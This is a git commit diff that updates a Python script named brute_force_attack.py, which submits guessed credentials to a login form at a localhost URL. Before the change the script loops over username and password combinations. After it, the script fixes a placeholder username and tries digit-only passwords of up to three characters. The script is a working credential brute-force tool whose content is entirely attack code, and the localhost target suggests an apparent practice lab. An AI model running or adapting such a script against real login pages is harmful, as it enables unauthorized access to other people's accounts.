5a5f0cf41e888552cdf0fb9a984d985c64430c9c
luo33221 <98926663+luo33221@users.noreply.github.com>
2024-04-14 07:34:29 +0100

    Update brute_force_attack.py

--- webapp/brute_force_attack.py
+++ webapp/brute_force_attack.py
@@ -6,22 +6,20 @@ import itertools
 import string
 
 url = 'http://127.0.0.1:5000/login'
+Username = "USERNAME"
 
 def attempt_login(username, password):
     payload = {'username': username, 'password': password}
     response = requests.post(url, data=payload)
     return response.status_code == 200
 
-# Try different lengths for username and password
-for username_length in range(1, 7):
-    for password_length in range(1, 7):
-        for username in itertools.product(string.ascii_lowercase + string.digits, repeat=username_length):
-            for password in itertools.product(string.ascii_lowercase + string.digits, repeat=password_length):
-                username_str = ''.join(username)
-                password_str = ''.join(password)
-                
-                print(f"Trying Username: {username_str}, Password: {password_str}")
-                
-                if attempt_login(username_str, password_str):
-                    print(f"Success! Username: {username_str}, Password: {password_str}")
-                    break
+# Try different lengths for password
+for password_length in range(1, 4):
+    for password in itertools.product( string.digits, repeat=password_length):
+        password_str = ''.join(password)
+        
+        print(f"Trying Username: {Username}, Password: {password_str}")
+        
+        if attempt_login(Username, password_str):
+            print(f"Success! Username: {Username}, Password: {password_str}")
+            break
